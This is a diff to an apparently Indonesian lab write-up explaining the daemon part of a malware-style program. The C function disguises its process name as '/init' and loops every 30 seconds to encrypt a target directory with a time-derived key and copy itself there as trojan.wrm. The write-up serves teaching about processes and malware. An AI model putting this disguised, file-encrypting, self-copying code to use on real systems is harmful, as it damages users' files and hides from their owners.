@@ -634,7 +634,49 @@ if (src && dst) {
     }
 }` Membuka file malware dari lokasiMalware dan membuka file tujuan trojan.wrm di direktori target. Kemudian, menyalin isi file malware ke dalam file tujuan.
 
-4. 
+4. Daemon
+```bash
+void inidaemon(const char *direktoriTarget, const char *lokasiSendiri) {
+    pid_t pid, sid;
+
+    pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS);
+
+    umask(0);
+    sid = setsid();
+    if (sid < 0) exit(EXIT_FAILURE);
+    if ((chdir("/")) < 0) exit(EXIT_FAILURE);
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
+
+    while (1) {
+        time_t waktu = time(NULL);
+        unsigned char kunci = (unsigned char)(waktu % 256);
+
+        encrypt(direktoriTarget, kunci);
+        trojan(direktoriTarget, lokasiSendiri);
+
+        sleep(30);
+    }
+}
+```
+- `pid_t pid, sid;
+pid = fork();
+if (pid < 0) exit(EXIT_FAILURE);
+if (pid > 0) exit(EXIT_SUCCESS);` Melakukan fork() untuk membuat proses anak.
+- `umask(0);
+sid = setsid();
+if (sid < 0) exit(EXIT_FAILURE);
+if ((chdir("/")) < 0) exit(EXIT_FAILURE);`
+-- umask(0) mengatur permission default file agar tidak dibatasi.
+-- setsid() membuat sesi baru agar proses menjadi leader tanpa terminal kontrol.
+-- chdir("/") mengubah direktori kerja ke root (/) agar daemon tidak mengunci direktori.
+
 
 
 
